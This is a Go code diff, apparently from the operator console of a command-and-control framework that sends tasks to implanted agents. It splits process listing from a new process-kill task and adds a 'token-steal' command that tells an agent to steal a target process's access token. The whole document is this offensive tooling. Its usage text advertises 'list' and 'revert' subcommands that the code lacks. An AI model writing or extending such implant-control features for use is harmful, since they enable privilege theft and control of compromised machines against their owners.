@@ -10,7 +10,7 @@ import (
 )
 
 var CmdCodeMap = map[string]int{
-	"proc":      0,
+	"proc-list":      0,
 	"cmd":       1,
 	"cat":       2,
 	"ls":        3,
@@ -25,6 +25,8 @@ var CmdCodeMap = map[string]int{
 	"download":  12,
 	"upload":    13,
 	"reconfig":  14,
+	"proc-kill": 15,
+	"token-steal": 16,
 }
 
 func (c *CLI) requireAgent() bool {
@@ -130,7 +132,17 @@ func (c *CLI) HandlePROC(args []string) {
 		return
 	}
 
-	c.sendTask("proc", "", "", "")
+	sub := args[0]
+	switch sub {
+	case "list":
+		c.sendTask("proc-list", "", "", "")
+		break
+	case "kill":
+		c.sendTask("proc-kill", args[1], "", "int")
+		break
+	default:
+		c.ui.Send(ui.WARN.Sprint("Unknown subcommand"))
+	}
 }
 
 func (c *CLI) HandlePWD(args []string) {
@@ -192,5 +204,21 @@ func (c *CLI) HandleReconfig(args []string) {
 }
 
 
+func (c *CLI) HandleToken(args []string) {
+	if !c.requireAgent() {
+		return
+	}
+	if len(args) != 2 {
+		c.ui.Send(ui.BAD.Sprint("Usage: token steal <pid> | list | revert"))
+		return
+	}
 
+	action := args[0]
+	switch action {
+	case "steal":
+		c.sendTask("token-steal", args[1], "", "int")
+	default:
+		c.ui.Send(ui.WARN.Sprint("Unknown subcommand"))
+	}
+}
 
